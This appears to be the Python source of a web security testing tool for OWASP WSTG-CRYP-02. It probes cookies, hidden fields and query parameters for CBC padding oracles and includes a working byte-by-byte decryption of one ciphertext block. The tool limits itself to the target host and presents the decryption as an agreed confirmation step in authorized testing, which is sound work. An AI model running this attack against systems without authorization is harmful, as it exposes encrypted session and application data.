"""Padding-oracle probe and one-block decrypt for CBC-encrypted client values (WSTG-CRYP-02).

`wstg-cryp padding-probe   --base URL [--http-root DIR] [--har DIR] [--samples DIR]
                           [--repeat N] [--max N] [--pause S]`   (step 3: find oracles)
`wstg-cryp padding-decrypt --base URL [the same evidence options] [--list |
                           --candidate N] [--repeat N] [--pause S] [--stop-file F]`
                                                                   (step 4: confirm one)

padding-decrypt recovers one plaintext block of a value the probe flagged, by querying
the oracle byte by byte (see decrypt_block). --list shows the candidate values without
sending anything; --candidate N decrypts the Nth of them. Like the probe it contacts only
the base host and reuses the logged-in session, and never prints a candidate's value.

For each encrypted-looking value sent to the client (a cookie, a hidden form field such
as ViewState, or a URL query parameter), the tool sends three versions of the same value
back to the application and compares the responses, with no decryption attempt:

1. original      - the value unchanged (the baseline).
2. bad-padding   - the last byte of the last ciphertext block flipped, so the decrypted
                   PKCS#7 padding is almost certainly invalid.
3. garbled       - the first byte of the second-to-last block flipped, so the content of
                   the last plaintext block is garbled but its padding byte stays valid.

A padding oracle shows itself when (2) is distinguishable from (3) in status code, body
length, or timing: the server tells "bad padding" apart from "valid padding, wrong
content". When the two are the same (or the value is rejected by a MAC before decryption),
there is no oracle signal. The tool only reports the difference; the pass/fail decision is
left to the criteria and the AI prompt, and a suspected oracle is confirmed separately with
padbuster (step 4, manual, by agreement).

This is a Python HTTP client (no Burp): only the host of --base is contacted, each request
is a normal request with one value changed, and logged-in candidates reuse the session from
the har-browse storage state. Token values are never printed (name, encoding, and decoded
length only). Exit 4 when candidates existed but none got an answer.
"""
from __future__ import annotations

import argparse
import base64
import binascii
import re
import sys
import time
from collections import Counter
from dataclasses import dataclass, field
from html.parser import HTMLParser
from pathlib import Path
from statistics import median
from urllib.parse import parse_qsl, quote, unquote, urlencode, urljoin, urlsplit

from . import entrypoints as ep
from . import har as harmod

DEFAULT_MAX = 20
DEFAULT_REPEAT = 5
MIN_DECODED = 16          # ignore values that decode to fewer than one AES block
MAX_PRINTABLE = 0.70      # above this share of printable ASCII the value is likely plaintext


# ---- codecs -----------------------------------------------------------------------
# Each codec decodes a client value to raw bytes and encodes raw bytes back to the same
# textual form, so a mutated value goes back in exactly the shape the application sent.


@dataclass
class Codec:
    name: str
    decode: object
    encode: object


def _hex_decode(s: str) -> bytes | None:
    if len(s) >= 2 and len(s) % 2 == 0 and re.fullmatch(r"[0-9a-fA-F]+", s):
        return bytes.fromhex(s)
    return None


def _b64_std_decode(s: str) -> bytes | None:
    if not re.fullmatch(r"[A-Za-z0-9+/]+={0,2}", s):
        return None
    try:
        return base64.b64decode(s + "=" * (-len(s) % 4), validate=False)
    except (binascii.Error, ValueError):
        return None


def _b64_url_decode(s: str) -> bytes | None:
    if not re.fullmatch(r"[A-Za-z0-9\-_]+={0,2}", s) or ("-" not in s and "_" not in s):
        return None
    try:
        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    except (binascii.Error, ValueError):
        return None


def _urltoken_decode(s: str) -> bytes | None:
    """.NET UrlToken (padbuster -encoding 3): base64 with +/ -> -_ and the '=' padding
    replaced by a single trailing digit giving the number of '=' removed."""
    if len(s) < 2 or not s[-1].isdigit() or int(s[-1]) > 2:
        return None
    body, pad = s[:-1], int(s[-1])
    if not re.fullmatch(r"[A-Za-z0-9\-_]+", body):
        return None
    try:
        return base64.urlsafe_b64decode(body + "=" * pad)
    except (binascii.Error, ValueError):
        return None


def _hex_encode(b: bytes, sample: str) -> str:
    return b.hex().upper() if sample.isupper() else b.hex()


def _b64_std_encode(b: bytes, sample: str) -> str:
    out = base64.b64encode(b).decode()
    return out.rstrip("=") if "=" not in sample else out


def _b64_url_encode(b: bytes, sample: str) -> str:
    out = base64.urlsafe_b64encode(b).decode()
    return out.rstrip("=") if "=" not in sample else out


def _urltoken_encode(b: bytes, sample: str) -> str:
    raw = base64.urlsafe_b64encode(b).decode()
    stripped = raw.rstrip("=")
    return f"{stripped}{len(raw) - len(stripped)}"


_CODECS = [
    Codec("hex", _hex_decode, _hex_encode),
    Codec("base64", _b64_std_decode, _b64_std_encode),
    Codec("base64url", _b64_url_decode, _b64_url_encode),
    Codec("urltoken", _urltoken_decode, _urltoken_encode),
]


def decode_candidate(value: str) -> tuple[Codec, bytes] | None:
    """The first codec whose decode of `value` looks like a CBC block-cipher value
    (at least one block, a multiple of 8 or 16 bytes, not readable plaintext)."""
    best = None
    for c in _CODECS:
        raw = c.decode(value)
        if raw is None or len(raw) < MIN_DECODED or len(raw) % 8 != 0:
            continue
        printable = sum(0x20 <= x < 0x7f for x in raw) / len(raw)
        if printable > MAX_PRINTABLE:
            continue
        if len(raw) % 16 == 0:          # AES block size: prefer it over an 8-byte match
            return c, raw
        best = best or (c, raw)
    return best


def mutate(raw: bytes, bs: int) -> tuple[bytes, bytes]:
    """(bad-padding bytes, garbled-content bytes): flip the last byte (padding), and the
    first byte of the second-to-last block (content of the last block, padding intact)."""
    pad = bytearray(raw)
    pad[-1] ^= 0x01
    gar = bytearray(raw)
    gar[len(raw) - 2 * bs if len(raw) >= 2 * bs else 0] ^= 0x01
    return bytes(pad), bytes(gar)


# ---- candidates -------------------------------------------------------------------


@dataclass
class Cand:
    name: str
    where: str                     # cookie | hidden | query
    value: str                     # the value as the application sent it (percent-decoded form kept separate)
    url: str                       # request URL (cookie: base; query: full URL; hidden: form action)
    method: str = "GET"
    role: str = ""                 # "" = anonymous, else the logged-in role it came from
    cookie_ctx: str = ""           # session Cookie header for logged-in replays
    fields: list = field(default_factory=list)   # hidden forms: [(name, value)] of the other fields
    quoted: bool = False           # the value was percent-encoded in its channel


_SET_COOKIE_RE = re.compile(r"(?im)^\s*set-cookie:\s*([^=;\s]+)=([^;\r\n]*)")


class _Inputs(HTMLParser):
    """Forms with their input name/value pairs and which inputs are hidden."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms: list[dict] = []
        self._cur: dict | None = None

    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or "") for k, v in attrs}
        if tag == "form":
            self._cur = {"action": a.get("action", ""), "method": (a.get("method") or "GET").upper(),
                         "inputs": []}
            self.forms.append(self._cur)
        elif tag == "input" and self._cur is not None and a.get("name"):
            self._cur["inputs"].append((a["name"], a.get("type", "").lower(), a.get("value", "")))

    def handle_endtag(self, tag):
        if tag == "form":
            self._cur = None


def _unquote_value(v: str) -> tuple[str, bool]:
    """The value with percent-encoding removed, and whether it was percent-encoded."""
    if "%" in v:
        u = unquote(v)
        if u != v:
            return u, True
    return v, False


def _cookie_cands(text: str, base: str, role: str, ctx: str) -> list[Cand]:
    out = []
    for name, raw in _SET_COOKIE_RE.findall(text):
        val, q = _unquote_value(raw.strip())
        out.append(Cand(name, "cookie", val, base + "/", "GET", role, ctx, quoted=q))
    return out


def _hidden_cands(html: str, base: str, host: str) -> list[Cand]:
    p = _Inputs()
    try:
        p.feed(html)
    except (ValueError, AssertionError):
        return []
    out = []
    for form in p.forms:
        action = urljoin(base + "/", form["action"] or "")
        sp = urlsplit(action)
        if (sp.hostname or "").lower() != host:
            continue
        others = [(n, v) for n, t, v in form["inputs"] if t != "hidden"]
        for name, typ, value in form["inputs"]:
            if typ != "hidden" or not value:
                continue
            val, q = _unquote_value(value)
            keep = [(n, v) for n, v in others] + [(n, v) for n, t, v in form["inputs"]
                                                  if t == "hidden" and n != name]
            out.append(Cand(name, "hidden", val, action, form["method"] or "POST",
                            fields=keep, quoted=q))
    return out


def gather(base: str, http_root: Path | None, har: Path | None,
           samples: Path | None) -> tuple[list[Cand], list[str]]:
    sp = urlsplit(base)
    host = (sp.hostname or "").lower()
    notes: list[str] = []
    cands: list[Cand] = []

    # Anonymous cookies and hidden fields from the pre-login root response.
    if http_root:
        so = http_root / "stdout.txt"
        if so.is_file():
            cands += _cookie_cands(so.read_text(errors="replace"), base, "", "")
        body = http_root / "body.html"
        if body.is_file():
            cands += _hidden_cands(body.read_text(errors="replace"), base, host)

    # More anonymous cookie samples (one Set-Cookie per sample response).
    if samples:
        so = samples / "stdout.txt"
        if so.is_file():
            cands += _cookie_cands(so.read_text(errors="replace"), base, "", "")

    # Logged-in session cookies and URL parameters from the browsing HAR.
    if har:
        inv = ep.Inventory(base.rstrip("/") + "/")
        states = ep.read_har(inv, har)
        ctx_by_role = {}
        for role, st in states:
            if harmod._ANON_ROLE_RE.match(role):
                continue
            header = ep.cookie_header(st, sp.scheme, host, "/")
            if not header:
                continue
            ctx_by_role[role] = header
            for c in st.get("cookies") or []:
                dom = str(c.get("domain", "")).lower().lstrip(".")
                if host == dom or host.endswith("." + dom):
                    val, q = _unquote_value(str(c.get("value", "")))
                    cands.append(Cand(str(c.get("name")), "cookie", val, base + "/", "GET",
                                      role, header, quoted=q))
        for f in ep._files(har):
            if f.suffix.lower() != ".har":
                continue
            role = harmod._role(f.name)
            ctx = "" if harmod._ANON_ROLE_RE.match(role) else ctx_by_role.get(role, "")
            for e in harmod._load(f) or []:
                req = e.get("request") or {}
                if str(req.get("method", "")).upper() != "GET":
                    continue
                u = str(req.get("url", ""))
                up = urlsplit(u)
                if (up.hostname or "").lower() != host or not up.query:
                    continue
                if harmod._STATIC_RE.search(up.path):
                    continue
                for name, value in parse_qsl(up.query, keep_blank_values=True):
                    val, q = _unquote_value(value)
                    cands.append(Cand(name, "query", val, u, "GET", role, ctx, quoted=q))

    # Keep only block-cipher-looking values, deduplicated by (where, name, value).
    out, seen = [], set()
    for c in cands:
        key = (c.where, c.name, c.value)
        if key in seen or decode_candidate(c.value) is None:
            continue
        seen.add(key)
        out.append(c)
    if not out and not (http_root or har or samples):
        notes.append("no evidence folder given")
    return out, notes


# ---- probing ----------------------------------------------------------------------


def _set_cookie(header: str, name: str, value: str) -> str:
    parts = [p.strip() for p in header.split(";") if p.strip()]
    out, found = [], False
    for p in parts:
        if p.split("=", 1)[0] == name:
            out.append(f"{name}={value}")
            found = True
        else:
            out.append(p)
    if not found:
        out.append(f"{name}={value}")
    return "; ".join(out)


def _request(c: Cand, token: str):
    """(url, cookie header, body bytes, method, extra headers) that sends the token string
    `token` as the candidate value. Each channel applies its own wire encoding, so `token`
    is always the plain codec text (never pre-percent-encoded)."""
    if c.where == "cookie":
        # Cookie values are not urlencoded by the client; match the original wire form.
        wire = quote(token, safe="") if c.quoted else token
        header = _set_cookie(c.cookie_ctx, c.name, wire) if c.cookie_ctx else f"{c.name}={wire}"
        return c.url, header, None, "GET", None
    if c.where == "query":
        sp = urlsplit(c.url)
        pairs = [(n, token if n == c.name else v)
                 for n, v in parse_qsl(sp.query, keep_blank_values=True)]
        url = f"{sp.scheme}://{sp.netloc}{sp.path}?{urlencode(pairs, quote_via=quote)}"
        return url, c.cookie_ctx, None, "GET", None
    # hidden form field (urlencode percent-encodes the token for the body)
    items = [(n, v) for n, v in c.fields] + [(c.name, token)]
    body = urlencode(items, quote_via=quote).encode()
    return c.url, "", body, "POST", {"Content-Type": "application/x-www-form-urlencoded"}


@dataclass
class Measure:
    status: int | None
    size: int
    ms: int
    answered: int


def _measure(c: Cand, send_value: str, repeat: int, pause: float) -> Measure:
    url, cookie, body, method, extra = _request(c, send_value)
    statuses, sizes, times = [], [], []
    for i in range(repeat):
        if i and pause:
            time.sleep(pause)
        t0 = time.perf_counter()
        a = ep.fetch(url, cookie=cookie, extra_headers=extra, data=body, method=method)
        dt = (time.perf_counter() - t0) * 1000
        if a.status is not None:
            statuses.append(a.status)
            sizes.append(a.size)
            times.append(dt)
    if not statuses:
        return Measure(None, 0, 0, 0)
    status = Counter(statuses).most_common(1)[0][0]
    return Measure(status, int(median(sizes)), int(median(times)), len(statuses))


_WHERE = {"cookie": "cookie", "hidden": "hidden field", "query": "query parameter"}


def _label(c: Cand, codec: Codec, raw: bytes, bs: int) -> str:
    return (f'{_WHERE[c.where]} "{c.name}" ({codec.name}, decoded={len(raw)}, block={bs}'
            + (f", role={c.role}" if c.role else ", anonymous") + ")")


def _verdict(orig: Measure, pad: Measure, gar: Measure) -> tuple[str, str]:
    if not (orig.answered and pad.answered and gar.answered):
        return "INCONCLUSIVE", "one or more cases got no answer"
    if pad.status != gar.status:
        return "SUSPECTED-ORACLE", f"status {pad.status} (bad padding) vs {gar.status} (garbled content)"
    thresh = max(16, int(0.02 * max(pad.size, gar.size)))
    if abs(pad.size - gar.size) > thresh:
        return "SUSPECTED-ORACLE", f"length {pad.size} (bad padding) vs {gar.size} (garbled content)"
    if abs(pad.ms - gar.ms) > max(50, 3 * max(1, abs(orig.ms - gar.ms))):
        return "TIMING-DIFF", f"{pad.ms} ms (bad padding) vs {gar.ms} ms (garbled content); confirm by hand"
    return "NO-SIGNAL", "bad padding and garbled content give the same response"


def run(args) -> int:
    base = args.base.rstrip("/")

    def folder(v):
        return Path(v) if v else None

    cands, notes = gather(base, folder(args.http_root), folder(args.har), folder(args.samples))
    host = (urlsplit(base).hostname or "").lower()
    print(f"# padding-oracle probe on {host}; 3 cases per value (original, bad-padding, "
          f"garbled-content), Python HTTP client, only this host contacted, no decryption")
    print(f"# repeat={args.repeat} (median status/length/time); token values are not shown")
    for n in notes:
        print(f"# note: {n}")
    over = max(0, len(cands) - args.max)
    cands = cands[:args.max]
    print(f"# {len(cands)} candidate value(s) probed"
          + (f", {over} over the limit of {args.max} (not sent)" if over else ""))
    if not cands:
        print("\n(no encrypted-looking value found in the given evidence. Record "
              '"no encrypted values" with the list of parameters examined - this is not a pass.)')
        return 0

    sent = answered = suspected = 0
    for c in cands:
        codec, raw = decode_candidate(c.value)
        bs = 16 if len(raw) % 16 == 0 else 8
        pad_raw, gar_raw = mutate(raw, bs)
        label = _label(c, codec, raw, bs)
        meas = {
            "original": _measure(c, c.value, args.repeat, args.pause),
            "bad-padding": _measure(c, codec.encode(pad_raw, c.value), args.repeat, args.pause),
            "garbled": _measure(c, codec.encode(gar_raw, c.value), args.repeat, args.pause),
        }
        sent += 1
        print(f"\n- {label} @ {c.method} {harmod._template(urlsplit(c.url).path) or '/'}")
        for name in ("original", "bad-padding", "garbled"):
            m = meas[name]
            if m.answered:
                answered += 1
                print(f"    {name:<12}: HTTP {m.status}, {m.size} bytes, {m.ms} ms")
            else:
                print(f"    {name:<12}: no answer")
        tag, why = _verdict(meas["original"], meas["bad-padding"], meas["garbled"])
        if tag == "SUSPECTED-ORACLE":
            suspected += 1
            print(f"    => SUSPECTED ORACLE: {why}. Confirm with wstg-cryp padding-decrypt / Tools > Padding oracle decrypt (step 4, by agreement).")
        elif tag == "TIMING-DIFF":
            print(f"    => TIMING DIFFERENCE: {why}")
        elif tag == "INCONCLUSIVE":
            print(f"    => inconclusive: {why}")
        else:
            print(f"    => no oracle signal: {why}")

    if sent and not answered:
        print(f"\nno request to {host} got an answer; check the scope and collect again", file=sys.stderr)
        return 4
    print(f"\n# verdict: {suspected} candidate(s) with a suspected padding-oracle signal, "
          f"{sent - suspected} with none. Confirm a flagged one with padding-decrypt (step 4, by agreement); none is decrypted here.")
    return 0


# ---- decryption (WSTG-CRYP-02 step 4: confirm a suspected oracle) ------------------
#
# A CBC padding oracle recovers one plaintext block without the key. To decrypt the
# last block T of a value whose preceding block is P, the tool sends a two-block value
# F | T with a forged first block F and asks the oracle "is the padding valid?" (the
# response the step-3 probe found: the garbled-content case means valid padding, the
# bad-padding case means invalid). Byte by byte, from the last, it finds the F byte that
# makes the final padding valid for pad length 1, 2, ...: then the intermediate state is
# I[j] = F[j] XOR pad, and the real plaintext is Pt[j] = I[j] XOR P[j]. Only one block is
# decrypted (padbuster, limited); this contacts only the base host and keeps the session.


class StopRequested(Exception):
    pass


def _classifier(ref_ok: Measure, ref_bad: Measure):
    """A function telling a measured response apart as valid padding (True) or not,
    from the valid-padding (garbled) and invalid-padding (bad) reference responses."""
    if not (ref_ok.answered and ref_bad.answered):
        return None
    if ref_ok.status != ref_bad.status:
        ok = ref_ok.status
        return lambda m: m.answered and m.status == ok
    if abs(ref_ok.size - ref_bad.size) >= 16:
        ok, bad = ref_ok.size, ref_bad.size
        return lambda m: m.answered and abs(m.size - ok) < abs(m.size - bad)
    return None


def _oracle_ok(c: Cand, codec: Codec, blocks: bytes, classify, repeat: int, pause: float) -> bool:
    return classify(_measure(c, codec.encode(blocks, c.value), repeat, pause))


def decrypt_block(c: Cand, codec: Codec, prev: bytes, target: bytes, classify, *,
                  repeat: int, pause: float, bs: int, log=lambda s: None,
                  should_stop=lambda: False) -> tuple[bytes, bytes]:
    """Recover the intermediate state of one target block and its plaintext (I, Pt),
    where Pt = I XOR prev. Raises StopRequested if should_stop() turns true."""
    inter = bytearray(bs)
    for pad in range(1, bs + 1):
        pos = bs - pad
        forged = bytearray(bs)
        for k in range(pos + 1, bs):
            forged[k] = inter[k] ^ pad
        found = None
        for guess in range(256):
            if should_stop():
                raise StopRequested()
            forged[pos] = guess
            if not _oracle_ok(c, codec, bytes(forged) + target, classify, repeat, pause):
                continue
            if pad == 1 and pos > 0:
                # A false hit when the real last byte is already 0x02..: changing the
                # byte before it must keep the padding valid for a true 0x01.
                probe = bytearray(forged)
                probe[pos - 1] ^= 0xff
                if not _oracle_ok(c, codec, bytes(probe) + target, classify, repeat, pause):
                    continue
            found = guess
            break
        if found is None:
            raise ValueError(f"no padding-valid byte at position {pos} (the oracle is unreliable "
                             "or the signal changed); stopping")
        inter[pos] = found ^ pad
        plain = bytes(inter[k] ^ prev[k] for k in range(pos, bs))
        log(f"    byte {pos + 1}/{bs} recovered: plaintext so far {plain.hex()}")
    pt = bytes(inter[k] ^ prev[k] for k in range(bs))
    return bytes(inter), pt


def _show_block(pt: bytes) -> str:
    n = pt[-1]
    unpadded = pt[:-n] if 1 <= n <= len(pt) and pt[-n:] == bytes([n]) * n else pt
    printable = "".join(chr(b) if 0x20 <= b < 0x7f else "." for b in pt)
    tail = (f"  (PKCS#7 pad {n}, without padding: {unpadded.decode('utf-8', 'replace')!r})"
            if unpadded is not pt else "")
    return f"hex={pt.hex()}  text={printable!r}{tail}"


def run_decrypt(args) -> int:
    base = args.base.rstrip("/")
    host = (urlsplit(base).hostname or "").lower()

    def folder(v):
        return Path(v) if v else None

    cands, notes = gather(base, folder(args.http_root), folder(args.har), folder(args.samples))
    cands = cands[:args.max]
    if args.list:
        print(f"# {len(cands)} candidate value(s) on {host} (no request sent). Decrypt one with"
              " --candidate N (run the step-3 probe first to see which are SUSPECTED-ORACLE).")
        for i, c in enumerate(cands, 1):
            codec, raw = decode_candidate(c.value)
            bs = 16 if len(raw) % 16 == 0 else 8
            print(f"{i}\t{_label(c, codec, raw, bs)}")
        if not cands:
            print("(no encrypted-looking value found in the given evidence)")
        return 0

    if not 1 <= args.candidate <= len(cands):
        print(f"--candidate must be 1..{len(cands)} (run --list to see them)", file=sys.stderr)
        return 2
    c = cands[args.candidate - 1]
    codec, raw = decode_candidate(c.value)
    bs = 16 if len(raw) % 16 == 0 else 8
    if len(raw) < 2 * bs:
        print(f"candidate {args.candidate} is a single {bs}-byte block: without the IV its plaintext "
              "cannot be recovered. Pick a longer value.", file=sys.stderr)
        return 2

    stop = Path(args.stop_file) if args.stop_file else None

    def should_stop() -> bool:
        return bool(stop and stop.is_file())

    print(f"# padding-oracle decrypt on {host}, candidate {args.candidate}: {_label(c, codec, raw, bs)}")
    print(f"# {_WHERE[c.where]} {c.name} @ {c.method} {harmod._template(urlsplit(c.url).path) or '/'};"
          f" Python HTTP client, only this host contacted, last block only")
    for n in notes:
        print(f"# note: {n}")

    pad_raw, gar_raw = mutate(raw, bs)
    ref_ok = _measure(c, codec.encode(gar_raw, c.value), args.repeat, args.pause)     # valid padding
    ref_bad = _measure(c, codec.encode(pad_raw, c.value), args.repeat, args.pause)    # invalid padding
    classify = _classifier(ref_ok, ref_bad)
    if classify is None:
        print("the oracle signal is not clear enough to decrypt (valid-padding and bad-padding "
              "responses are too close); re-run the step-3 probe.", file=sys.stderr)
        return 4
    print(f"# oracle signal: valid padding ~ {ref_ok.status}/{ref_ok.size}B, "
          f"invalid ~ {ref_bad.status}/{ref_bad.size}B. Up to {bs * 256} requests for this block.",
          flush=True)

    prev, target = raw[-2 * bs:-bs], raw[-bs:]
    try:
        inter, pt = decrypt_block(c, codec, prev, target, classify, repeat=args.repeat,
                                  pause=args.pause, bs=bs, log=lambda s: print(s, flush=True),
                                  should_stop=should_stop)
    except StopRequested:
        print("\nstopped before the block was finished; nothing recovered.", flush=True)
        return 3
    except ValueError as e:
        print(f"\n{e}", file=sys.stderr)
        return 4
    print(f"\n# last block recovered ({args.candidate}: {c.name}):")
    print(f"  intermediate: {inter.hex()}")
    print(f"  plaintext:    {_show_block(pt)}")
    print("\n# Record this block, the parameter, and the oracle signal as the finding. "
          "Decrypt another candidate with --candidate N.", flush=True)
    return 0


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(prog="wstg-cryp", description=__doc__.split("\n\n")[0])
    sub = ap.add_subparsers(dest="cmd", required=True)
    pp = sub.add_parser("padding-probe", help="CBC padding-oracle probe (WSTG-CRYP-02)")
    pp.add_argument("--base", required=True, help="base URL of the target (the only host contacted)")
    pp.add_argument("--http-root", help="http-root-https evidence version folder")
    pp.add_argument("--har", help="har-browse evidence version folder")
    pp.add_argument("--samples", help="session-token-samples evidence version folder")
    pp.add_argument("--repeat", type=int, default=DEFAULT_REPEAT, help="requests per case (median)")
    pp.add_argument("--max", type=int, default=DEFAULT_MAX, help="candidate values to probe")
    pp.add_argument("--pause", type=float, default=0, help="seconds between requests")

    pd = sub.add_parser("padding-decrypt",
                        help="decrypt one block of a suspected padding oracle (WSTG-CRYP-02 step 4)")
    pd.add_argument("--base", required=True, help="base URL of the target (the only host contacted)")
    pd.add_argument("--http-root", help="http-root-https evidence version folder")
    pd.add_argument("--har", help="har-browse evidence version folder")
    pd.add_argument("--samples", help="session-token-samples evidence version folder")
    pd.add_argument("--list", action="store_true", help="list the candidate values and exit (no request)")
    pd.add_argument("--candidate", type=int, default=0, help="1-based candidate to decrypt (see --list)")
    pd.add_argument("--repeat", type=int, default=1, help="requests per oracle query (median)")
    pd.add_argument("--max", type=int, default=DEFAULT_MAX, help="candidate values considered")
    pd.add_argument("--pause", type=float, default=0, help="seconds between requests")
    pd.add_argument("--stop-file", help="stop gracefully as soon as this file exists")

    args = ap.parse_args(argv)
    return run_decrypt(args) if args.cmd == "padding-decrypt" else run(args)


if __name__ == "__main__":
    raise SystemExit(main())
